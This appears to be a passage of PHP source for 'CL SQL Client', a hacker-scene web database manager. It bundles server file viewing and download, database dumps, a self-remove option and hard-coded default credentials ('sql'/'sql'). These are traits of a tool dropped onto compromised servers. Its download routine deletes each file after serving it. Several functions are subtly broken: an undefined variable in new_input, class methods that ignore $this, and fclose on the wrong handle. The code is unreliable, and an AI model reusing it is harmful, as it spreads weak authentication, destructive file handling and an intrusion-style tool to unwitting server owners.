<?php
/*
/********************************************************************************
/*
/*  CL SQL Client - продвинутый SQL-менеджер не уступающий phpmyadmin аналогам.
/*
/*  Вы можете бесплатно скачать последнюю версию на домашней страничке продукта (cyberlords.net):
/*
/*  ~~~~~~~~~~~~~~~~
/*  [!] Important
/*  [+] New
/*  [-] Fixed error
/*  [*] Changes
/*  ~~~~~~~~~~~~~~~~
/*
/*  Library features:
/*   ~ Оптимизированый алгоритм
/*   ~ Возможность подключения к БД через Unix Socket
/*   ~ Просмотр, редактирование всех доступных баз для аккаунта, создание новых баз.
/*   ~ Просмотр, редактирование, создание новых таблиц со всевозможными атрибутами.
/*   ~ Редактирование отдельных полей таблиц, удаление записей, добавление записей в таблицу, переименование таблиц.
/*   ~ Выполнение произвольного запроса к БД и таблицам.
/*   ~ Дампы баз и таблиц, с возможностью отправки по HTTP или просто показа дампа в броузере.
/*   ~ Просмотр файлов.
/*
/*  Date started: 26.09.2005
/*
/*  Coded by n0 [nZer0]
/*  Copyright (C) n0 2002-2005
/*  www.cyberlords.net
/*
/*  Last modify: 10.01.2006 v.1.0 pre-release build #7
/*
/*  At least some greetz fly to: Peng(0), k0pa, Satyr =)
/*
/********************************************************************************
*/

//-----------------------------------------------
// USER CONFIGURABLE ELEMENTS
//-----------------------------------------------

// Script self [!]
$baseurl  = $_SERVER["PHP_SELF"]."?";
// Self Version
$version = 'v.1.0 pre-release build #7';
// Language [!][+]
$language = "ru";
// Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp) [!]
$tmpdir = "./";
// Use unix socket? Only for MySQL
$unix_socket = 0;
// time limit of execution this script over server quote (seconds), 0 = unlimited.
$timelimit = 0;
// Authentification [+]
$auth = 1;
// user login
$user = 'sql'; 
// DON'T FORGOT ABOUT PASSWORD!!!
$passwd = 'sql'; // user password
// http-auth message [+]
$login_txt = "User Authenticate :: SQL Client";
// http-auth error message [+]
$accessdeniedmess = "<h3>Access Forbidden</h3><BR>You must enter a valid login and password to access this resource";

// OS
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
if($win) {
 $unix_socket = 0;
}

// Set php.ini sections
ignore_user_abort(true); // ignore user abort
ini_set( 'display_errors', true ); // display errors
ini_set( 'html_errors', false ); // html error
if($unix_socket && dbtype == 'mysql') {
 ini_set( 'mysql.default_socket', "/tmp/mysql.sock" ); // [!][+]
}
error_reporting(E_ERROR | E_PARSE | E_WARNING); // Error reporting E_ERROR | E_PARSE | E_WARNING
ini_set( 'output_buffering', false ); // output buffering
set_time_limit($timelimit); // time limit
set_magic_quotes_runtime(false); // magic quotes runtime NULL

//-----------------------------------------------
// END USER CONFIGURABLE ELEMENTS
//-----------------------------------------------

// PHP version
$phpversion = phpversion();

// Authenticate function [+]
if (!@stristr($_SERVER["GATEWAY_INTERFACE"],"cgi") || $auth == true) {
 if (!empty($user) && ( !isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$user || $_SERVER['PHP_AUTH_PW']!==$passwd)) {
  header('WWW-Authenticate: Basic realm="'.$login_txt.'"');
  header('HTTP/1.0 401 Unauthorized');
  die( $accessdeniedmess );
 }
}

// HEADERS [!]
header("Content-Type: text/html; charset=windows-1251");
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// Checking php version [!]
if(version_compare($phpversion, '4.1.0') == -1) {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
}

// Cheking PHP version
if (str_replace('.',null,$phpversion) < 410) {
 die("<BR>Warning! You should update PHP to 4.1.0. Current version ".$phpversion."<BR><BR>");
}

// Checking magic_quotes_gpc()
if (@get_magic_quotes_gpc()) {
 foreach ($_POST as $k=>$v) {
  $_POST[$k] = stripslashes($v);
 }
 foreach ($_GET as $k=>$v) {
  $_GET[$k] = stripslashes($v);
 }
}

// Buffering start
@ob_start();
// Set options
@ob_implicit_flush(0);
// Start Session
@session_start();

// Microtime
if (!function_exists("get_micro_time")) {
 function get_micro_time() {
  list($usec, $sec) = explode(" ", microtime());
  return ((float)$usec + (float)$sec);
 }
}

// starttime
define("start_time",get_micro_time());

// Images Array
$images_array = array(
"sql"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE
dFJOU////wBAKqn0AAAAiUlEQVR42mJgZmZEAszMAAHEwMzIhAQYmQECCEMAIIBAAgwMTBAMEgAI
IKAAkGYCc8ECAAGEIQAQQGAzGJAEAAIILsAAFQAIIJAWsB6IyYzMAAGEZC0D2FqAAMJwB0AAYQgA
BBAD3C9AHsgvAAEEFIACRqA0EAAEEEKAmREsABBASALMYAGAAAMA5HsB3KxlNZ8AAAAASUVORK5C
YII=
",
"log_in_off"=>
"R0lGODlhFgAWAOYAAAAAAP////7+7////f///vfzbffzbvfzc/j0dvj0fvn1ivr3nPv4p/v5tfv
5tv382/PtbPXvh/bxmvfzsf370fn32v375P/62f364/377P/+9//kQP/nVf/nVv/qbf/uhf/uhv/
xoP/1vP/2wP/62/rVLO7ZaPfuwv366/raSvreaP3zzdfBd/756OrEXtO8fPLZlv/++8+2eMuwdeW
mKuzRm9TQyMywe+CaKsyxg/Ls4u7l2OWvZ+bYxffy7Prz7Pnu5OW3nseNbsqPc82nlsuMcsudisR
xVOCqlcpwVM2nmr9XO8V6ZcV+a7xHKMN5ZsV8acZ9a8V8a7+AcMqRgsqXi+W6r82nnsymnbxSOrx
SPMJxYMJ0Y8V8bLY8KLlKNbxSP8V8brlKObhIObtTQrtTRb5fUsp0aMFxZceKgcqln7lJO8Fzab9
5cMyMhMWHgMeRirtUSsFza7txa8qZlLtTTMN7d7ExLLtUUcFzcMN7eL15drtUUrxVU8BgX////yH
5BAEAADYALAAAAAAWABYAAAfPgDaCg4SFhoeIiYpVaExbT0aKhXJBLQEjKThekoJ5QDErbVMuGyV
OklhWBCRUgkIdGzRHimwoAhpvgkMeHBtZil0BFA8/e3MwILxailABDQ4PGhciIR8qYMwBDAvQ0tQ
8UYlERQESCtzR00lqiERSFj0sCefdSHXtUhg9LyYI8ws1zvDBh2GHDANLyJARs8YMHERKwljQMQN
CgTGcbFxxk4EihC9kmmS0E0PHjQgHyGQUZMdHjgl3ynBZaUPPgAon4tAURMdPHzxpdgodiigQADs=
",
"info"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs
/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv
/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3
/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr
/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX
pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA
dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW
9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK
4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm
C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg
2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF
CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA
Ow==",
"browse_db"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURZmZzAAAAP///2ZmZgAAANTzOHcA
AAAFdFJOU/////8A+7YOUwAAAG9JREFUeNpiYEEDAAHEwMKMAlgAAggowMDAAMJgwMwCEEAYAgAB
hKEFIICAAkxMTCAMBswsAAEEEmAECjCCAVAAIIAwVAAEEIYKgADCUAEQQBgqAAIIQwVAAGGoAAgg
DBUAAYThUoAAYkD3PkCAAQBJdwJ8aqfwRgAAAABJRU5ErkJggg==
",
"browse_tbl"=>
"iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAMAAAC67D+PAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAJUExURZmZzP///wAAAC6CLTEAAABCSURB
VHjaYmCCA4AAYmBigAImgABCYgIEEANCAUAAMTAxQgETQAABmRAxRiaAAEISBQggJFGAAEISBQgg
JBMAAgwAHDAAjTfpsEkAAAAASUVORK5CYII=
",
"host"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAVUExURf8AAMbGxoSEhJmZzP///wAAAAAA
AM12SjgAAAAHdFJOU////////wAaSwNGAAAAmklEQVR42mJgQwMAAcQAZzGBABsbQAAxsDGDARMT
IxAwsbIBBBBcgAUImIACAAHEwMYKYrJCFbCyAQQQXAAEWIEqAAIIJADRBNUCEEBAAVaIAFQLQACB
rIVrAmkBCCCQLRABqBaAAEIIgLQABQACCGQoKxgwMoAFAAIIzR1sbAABBBNgA6sC2gAQQAwQFivc
jwABxIDufYAAAwArFQQ55WWX3AAAAABJRU5ErkJggg==
",
"deltbl"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAkUExURZlmZv+ZM/9mAEBAQLOz2cwzM8wA
AP8AAJkAAP///4yMjAAAAL6JDcIAAAAMdFJOU///////////////ABLfzs4AAAC2SURBVHjaYuBG
AwABxMDNhQK4AQIIKMDAxsDFAgVs3AABBBRgY2TngHI5uLgBAgikhY2dnQOkHMjn4gYIIKAAJycn
GzsHkABiLm6AAAIJMHMCFXEA+UAGN0AAQVRwQdSAVAAEEEIFO0QFQAAhmcEONgMggMACID4zM0iE
ixsggEACrExsnGDADhQACCCgACsjWAEzSA0XN0AAgQSAzuKEAi5ugAACuZQD4Td2boAAYkD3PkCA
AQCA0wiXuX9engAAAABJRU5ErkJggg==
",
"drop"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURZlmZv+ZM/9mAMwzM8wAAP8AAJkA
AAAAAJHQzOoAAAAIdFJOU/////////8A3oO9WQAAAJFJREFUeNpiYEcDAAHEwM7AwgDnsbCzAwQQ
AzsLIysblAuiAQIIKMvCChEB89kBAgisnAUkAuGzAwQQRD9QBMpnBwggqIEsMHPYAQIIrgImAhBA
CDOgIgABxIBQDyEBAggowMzEAlHNCiIAAoiBnRnuMLAIQAABBeB8MAAIIKAWJD5QCUAAMaD7FiCA
MAQAAgwAYLoGdQu5RxIAAAAASUVORK5CYII=
",
"tbl"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURZmZzAAAAP///wAAAPTjxFQAAAAE
dFJOU////wBAKqn0AAAAZklEQVR42mJgRgMAAcSALgAQQEABBiTAzAwQQBgCAAEERIxMcMDIzAwQ
QGABRjhiZgYIIAwVAAGEoQIggDBUAAQQhgqAAMJQARBAGCoAAghDBUAAgQSQADMzQABheA4ggDAE
AAIMAAxGAgtuLhqmAAAAAElFTkSuQmCC
",
"db"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURZmZmZmZzAAAAP///wAAACr8yT8A
AAAFdFJOU/////8A+7YOUwAAAINJREFUeNpiYEEDAAHEAMSMMAASAAggDAGAAAIJMDFDABNIACCA
IAIMCEUAAQRVgRAACCCoCoQugABigBjJxMwEQSwAAQQXgKkACCAGiB0IFQABBBIAMeAqAAIIpgIG
WAACCKqCgQHiLBYWgABiQHUnCwtAAAEF4KrBACCAGNC9DxBgAG1fAsX0YasPAAAAAElFTkSuQmCC
",
"index"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURYCAgP//mZmZzP/MMwAAAP///2Zm
ZgAAAIJePFIAAAAIdFJOU/////////8A3oO9WQAAAJVJREFUeNpiYEcDAAHEwM6GAtgBAggowMTE
BMJMDKyMzCzsAAGEEADzWdgBAgiuBcJnYwcIIKAAKysrEDOA+Kxs7AABBBIA0qwMrCA+UAAggKAq
gHwQAJoBEEBQFSxAwAo2AyCAEGawQswACCAMMwACCK4CzAcKAAQQTAWEDxQACCCYCggfKAAQQBie
AwggBnTvAwQYAKRBBR9UXrlRAAAAAElFTkSuQmCC
",
"primary"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAABLUExURfnHAOq7APXEAPTDAPrIAO6+APzK
APPCAOy9AP7LAPHBAP3KAOa4APjGAO+/APDAAPfGAPvJAPLCAOi6AJmZzAAAAP///2ZmZgAAAMjq
96cAAAAZdFJOU////////////////////////////////wABNAq3AAAAtklEQVR42mKQQAMAAcQg
IQ4BoiAgLi4BEEBAAREREXERUR5GfiYWUXEJgACCCogKM7KKMnByikoABBBUiygHKzMzMxuDqARA
AAEFxMTExMVEBbmZ+BiBWgACCCQgChQQE2Vh5wAyJAACCKYCKMIlCmRIAAQQTIWoKIMQWAAggJBU
sIMFAAIIoYKFCSwAEEBIKgTAAgABhFDBxgsWAAggJBUMYAGAAIJ7DuhaECEBEEAM6N4HCDAAhuMU
XdCwN9oAAAAASUVORK5CYII=
",
"empty"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAVUExURczMzJmZzJmZmf///2ZmZgAAAAAA
AICwWGkAAAAHdFJOU////////wAaSwNGAAAAiElEQVR42mJgQwMAAcTAxoIC2AACCCjAyMgIwmDA
wgYQQHABVlZWsABAAEG0sMIACxtAAAEFmJlZmZiYGBgYgCQrG0AAQQQQgA0ggMACzCysTKwMQMzM
wgYQQBgCAAGEIQAQQBgCAAGEIQAQQBgCAAGEEGCGCAAEENRzMIeysAEEEAO69wECDAAaSAQP5Fbp
rQAAAABJRU5ErkJggg==
",
"edit"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURZmZzMzMzP///wAAAAAAAJ7/OwsAA
AAFdFJOU/////8A+7YOUwAAAIxJREFUeNpiYEEDAAHEAGMwgwALAwtAAMEEmBlBgJmBBSCAGGB8iA
gDC0AAMUDUMkJFGFgAAggowMQE4TODtQAEEEgAyIaIgQwFCCCwAFARRBRoGkAAgbWAAUgrUAAggBA
CTBABgACCagFbBRYACCAMFQABhKECIIAwVAAEENSlUAAUAAggBnTvAwQYAIWRAuW2b0fYAAAA
AElFTkSuQmCC
",
"reload"=>
"R0lGODlhFgAWANU/AFq69hZZuIXS9mTF+5Ph/Fym5GWx6ILb/Zzo/ond/jZosqXu/iNryn3W/ApSu
2nC83TO+yxpsUuX3oXX+mq87Vay7lF/rGK57HXW/jqD1RRcxEh2tGG986Dr/qLs/nHS/hphxYHO9CF
euJfm/mfI+3/N9G7P/ofW92nK/m7J+mm06Td0sG7O+y540Y7g/YDZ/G/Q/EBtr4jX+HTR+3HE8HXF8
WC/9wZPvCpzzmvM/XXU+oHR9l/B/R9pywBMvf///yH5BAEAAD8ALAAAAAAWABYAAAb/wJ9wKNyIfD2
fKEYUOpq/DaNQclknhkxgCNI0RRLZ7sGxDSCNUaglAu16REWYUqkDADweKjEqCDpwQwwnNBcXHBwAN
jwDAygNCCOAQyIGYgYGKhMEDSkDJCg5DTMegT8MNS0OAQE+DjgGBAkpOSwwpIEbGRoRKxFbQgoMJSM
ztzoLgSIOGxYWCk09AiMNDS8HyUI3G0IWTSAhCAgdHgvmplBCrT7s7ewODu7ywOlCPeYLHh0dCCEg9
T9u2Ftw4MCLFwgEoIsy5IaIgRgwfIAUggE0ISJW/FihIQOTH/cifoABwwUBFTgc3GDloEUNBkNCHvh
gIgcJCJtkUMC0Q4YBUHo9PIw7YAIFiQE2ODx4QOECjRMwY3o4UQCBCxNHk16oQ0GGhAhEpIEQ0UIAg
gMQUiyl0VMCPSEa/qnLoEIGgbslCjD4SORJEwWtkgTg2yQI
ADs=
",
"back"=>
"R0lGODlhFgAWANU/AGXoXGvrYSKUIRWVFQuSC5T3eyzMKNr8yHPra1zUT4nzdHzuclrnVW3MYnLtZ
ReqFnvwarr8qlfSTUKYQjGoLJP0gY30eVPMSKj4l0vHRMT9tHfuakO3PITzcVzfVE/lSmvdXWbcWFu
eW2DUV1O5S4Xxec/9vVnOUGHWUuT/0r38sMjytnLgYrH4m676o7Puo2maab/3rZ75hIDvbo3VgY/xg
4DybqzonKX5jUfgP5D4g5rzg5rzjbP5oQCQAP///yH5BAEAAD8ALAAAAAAWABYAAAbuwJ9wSBSKisj
kTyQgKJ+/CWXlgyYFpEOqaiUSGqnYgdv9EWiHlmVc/g1uB1xBYfLZ7/aBYCh9mWQFFnQahCqGEYhOP
wIcMSoFkAodFRYlCwsImQsuVQMkGhiQgh02EA4BAAAMHx8AGD4DDRE7FoKSpaeoDB4SGSM8sA09FZI
dMxCmpwAeCRcXGSc1nRwYFccQG7khKAkSz9AlXAIUNTrZyiwgICEjIxInIwtkPw8IOg4A2xYzlwsb2
QgCKBpCwEMHENw24MFDYE8RAgYchJAQYF4XAg8CeGBgsc
uABzk+dOwywYeBkSTttEECY8CTIAA7
",
'home'=>
"R0lGODlhGAAYALMJAN3d3WZmZurq6vz5ALKysoaGhgQEBMzMzP///////wAAAAAAAAAAAAAAAAAAA
AAAACH5BAEAAAkALAAAAAAYABgAAAR8MMlJq704a1pmKcZWFUOYFIApngNBhKi6kW9rxCtt1G8q6gQ
EzyC7ABHIoeaITBpsGGbTCR3ZgtOpkkLcZb8voqWA/WZfRrP5UJQUsp+PYcpOT98CNr19gudfe3ZNB
QcEIIFjcIYBc011Ywe
RkR8BjJKRfF2am5srnp8aEQA7
",
"save"=>
"R0lGODlhEAAQAKIEAFVVVez1AP///yYmJv///wAAAAAAAAAAACH5BAEAAAQALAAAAAAQABAAAAM/S
LrcCjBK+cIQOOM76tXZIHpgaJGlMJwEYKUq637l2rWBJe5ifru5oNBX0fF2Mt9xkzTumD8lD7o4Wke
O7CIBADs=
",
"clear"=>
"R0lGODlhEAAQANU/ACY7SUZnh4ieyZ6yuN/m8Ka611qWsr3W477Z5JzJ1md+usXO4e7w9t3k797i7
2V+s2Foa5iqxKy/xl2it4+owaq52Ji704mjyo+gzNrf7dnk7jFUXrS/3B0zOebp80l6iWeWunqNvYa
myqPA15mjpVaPq1WRqIePkYSVn5GUlLG6vqartXiownq6ykZbgpGfxJrB1Pb3946gy42lzNPa6k6Jn
EiAkHyVoz1RccnS5rC72Ft7qw8ZHpq10wAAAP///yH5BAEAAD8ALAAAAAAQABAAAAZpwJ9wSCwaj8j
kcSFz4XwBkCpm1GE4vt3FNyqdjIqMI+cRASwHgPEVqtA8DA2sBjk+AAEfz7fpIAURKz4oPh8+fwUNB
gc+CYdHMwUEBgiNj0YUPZMINi2XRjcsJhMbPilKEgMD
JEqtrkVBADs=
",
"insert"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U
29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURf/MMzMzM8zMzGZmzAAAANwpnsUAAAA
FdFJOU/////8A+7YOUwAAAIFJREFUeNpiYEEDAAHEwMIIBhAeMwsLQAAxsDCBAESAmZmZBSCAoAJMc
BUAAQQVYIabARBAYDOYmBECAAHEANMLBGDDAQKIAcIHARZGBgYGFoAAYoDzoQIAAYShAiCAMMwACCA
MWwACCMMdAAGE6lIgAAggFL+AAEAAofoWCAACDACoswMV4KhprQAAAABJRU5ErkJggg==
",
"download"=>
"R0lGODlhEAAQALMAAAAAAP///wD/AAC/ACAZAZCJcf/GCvetCcDAwICAgP///wAAAAAAAAAAAAAAAA
AAACH5BAEAAAoALAAAAAAQABAAAARIUMmpziE002Ow1pz3bd04WSEBmJXhimY4JjRdEEVNSwni/0BfA
pAIGI9II40YDA4Ey15TKhz2dNirFZFMIqLZ8EoBKJvPZkkEADs=
",
"announse"=>
"R0lGODlhEwASAMQfAP/GjAhgjPT4+v6qVbqegv7r1/+dOq3H0v3Sp1RxcAICAo22zNWzjFmTr9XDq9a
PQmuhvN/r8ayGUO7XvkyIo4p/aH9hQ3eSlP+3b/7fv3+pu0o0Hy54nMHY42KZs////yH5BAEAAB8ALAA
AAAATABIAAAWe4CeO4tEsZJp2TXN41KGmkVvcRyDPIqTdwFyEB2ncJg6gBjI7cDKZiUJRgWYoqBTHYd0
oCFZHYDhaUBBogtqBRl80I0GAjbZMLW10QCBaXACAAAh3gYAXWRwMhQCEhQwcH3IYk5R3lJR7EQEDnJ1
3nZ0cEXKgA14KGw+lex8aCQawsbKxFUw9CRIPD7O6EgkQZCUUHBwBxsbELjzLKSEAOw==
",
);

if (!function_exists("create_image")) {
 function create_image( $value = false ) {
  global $images_array;
  return base64_decode($images_array[$value]);
 }
}

// Images
if (isset($_GET["image"])) {
 @ob_clean();
 header("Content-type: image/gif");
 header("Cache-control: public");
 header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
 header("Cache-control: max-age=".(60*60*24*7));
 header("Last-Modified: ".date("r",filemtime(__FILE__)));
 echo create_image($_GET["image"]);
 exit();
}

/*
 * Download file
 */
if (!function_exists("downloadfile")) {
 function downloadfile( $file ) {
  @ob_clean();
  $filetype = 'application/download';
  header("Pragma: public");
  header("Expires: 0");
  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
  header("Cache-Control: private",false);
  header("Content-Type: ".$filetype);
  header("Content-Disposition: attachment; filename=\"".basename($file)."\";");
  header("Content-Transfer-Encoding: binary");
  header("Content-Length: ".@filesize($file));
  set_time_limit(0);
  $buffer = ''; 
  $handle = @fopen($file, 'rb'); 
  if ($handle === false) { 
   return false; 
  } 
  while (!feof($handle)) { 
   $buffer .= fread($handle, 1024); 
  }
  @fclose($fp);
  echo $buffer; 
  unlink($file);
  exit;
 } 
}

/*
 * AddInput
 */
if (!function_exists("new_input")) {
 function new_input($type,$name,$size,$value) {
  $str = "<input type=\"".$type."\" name=\"".$name."\" ";
  if($size != 0) {
   $ret .= "size=\"".$size."\" ";
  }
  $str .= "value=\"".$value."\">";
  return $str;
 }
}

// Language array
$lang = array(
 // Russian
 'ru_text1' => 'Загрузить файл',
 'ru_text2' => 'Запрос',
 'ru_text3' => 'Статус сервера',
 'ru_text4' => 'Переменные сервера',
 'ru_text5' => 'Процессы сервера',
 'ru_text6' => 'Список БД',
 'ru_text7' => 'БД',
 'ru_text8' => 'Actions',
 'ru_text9' => 'Создать БД',
 'ru_text10' => 'Всего БД',
 'ru_text11' => 'Показать',
 'ru_text12' => 'Сохранить БД',
 'ru_text13' => 'Удалить БД',
 'ru_text14' => 'Таблица',
 'ru_text15' => 'Создать таблицу',
 'ru_text16' => 'Структура',
 'ru_text17' => 'Показать',
 'ru_text18' => 'Вставить',
 'ru_text19' => 'Редактировать',
 'ru_text20' => 'Удалить',
 'ru_text21' => 'Сохранить таблицу',
 'ru_text22' => 'Структура таблицы',
 'ru_text23' => 'Структуру и информацию',
 'ru_text24' => 'Структуру',
 'ru_text25' => 'Информацию',
 'ru_text26' => 'Скачать',
 'ru_text27' => 'Внимание!!! Файл не существует или нет прав для чтения',
 'ru_text28' => 'Внимание!!! Файл пустой или другая ошибка',
 'ru_text29' => 'Информация SQL сервера',
 'ru_text30' => 'Удалить скрипт',
 'ru_text31' => 'Спасибо что пользовались SQL клиентом '.$version,
 // English  
 'en_text1' => 'Load File',
 'en_text2' => 'Query',
 'en_text3' => 'Server status',
 'en_text4' => 'Server variables',
 'en_text5' => 'Process list',
 'en_text6' => 'DB List',
 'en_text7' => 'DB',
 'en_text8' => 'Actions',
 'en_text9' => 'Create DB',
 'en_text10' => 'Total DB',
 'en_text11' => 'Load',
 'en_text12' => 'Dump DB',
 'en_text13' => 'Drop DB',
 'en_text14' => 'Table',
 'en_text15' => 'Create Table',
 'en_text16' => 'Desc',
 'en_text17' => 'Show',
 'en_text18' => 'Insert',
 'en_text19' => 'Edit',
 'en_text20' => 'Delete',
 'en_text21' => 'Dump Table',
 'en_text22' => 'Table Desc',
 'en_text23' => 'Desc and data info',
 'en_text24' => 'Desc info',
 'en_text25' => 'Data info',
 'en_text26' => 'Download',
 'en_text27' => 'Warning!!! File not exists or not readable',
 'en_text28' => 'Warning!!! File is empty or some error',
 'en_text29' => 'Server Information',
 'en_text30' => 'Self remove',
 'en_text31' => 'Thanks for using SQL Client '.$version,
);

class ResultSet {
 var $result;
 var $total_rows;
 var $fetched_rows;

 function set_result( $res ) {
  $result = $res;
 }

 function get_result() {
  return $result;
 }

 function set_total_rows( $rows ) {
  $total_rows = $rows;
 }

 function get_total_rows() {
  return $total_rows;
 }

 function set_fetched_rows( $rows ) {
  $fetched_rows = $rows;
 }

 function get_fetched_rows() {
  return $fetched_rows;
 }

 function increment_fetched_rows() {
  $fetched_rows = $fetched_rows + 1;
 }
}

if (!function_exists("sql_error")) {
 function sql_error() {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return mysql_error();
   break;;
   case "mSQL":
    return msql_error($host);
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("sql_connect")) {
 function sql_connect($host, $user, $password, $db) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    $dbi=@mysql_connect($host, $user, $password);
    @mysql_select_db($db);
    return $dbi;
   break;;
   case "mSQL":
    $dbi=msql_connect($host);
    msql_select_db($db);
    return $dbi;
   break;;
   case "postgres":
    $dbi=@pg_connect("host=$host user=$user password=$password port=5432 dbname=$db");
    return $dbi;
   break;;
   case "postgres_local":
    $dbi=@pg_connect("user=$user password=$password dbname=$db");
    return $dbi;
   break;;
   case "ODBC":
    $dbi=@odbc_connect($db,$user,$password);
    return $dbi;
   break;;
   case "ODBC_Adabas":
    $dbi=@odbc_connect($host.":".$db,$user,$password);
    return $dbi;
   break;;
   case "Interbase":
    $dbi=@ibase_connect($host.":".$db,$user,$password);
    return $dbi;
   break;;
   case "Sybase":
    $dbi=@sybase_connect($host, $user, $password);
    sybase_select_db($db,$dbi);
    return $dbi;
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("sql_list_processes")) {
 function sql_list_processes($id) {
  global $dbtype;
  switch ($dbtype) {
   case "mysql":
    return @mysql_list_processes($id);
   break;;
   default:
   break;;
  }
 }
}

if (!function_exists("sql_field_name")) {
 function sql_field_name($res,$count) {
  global $dbtype;
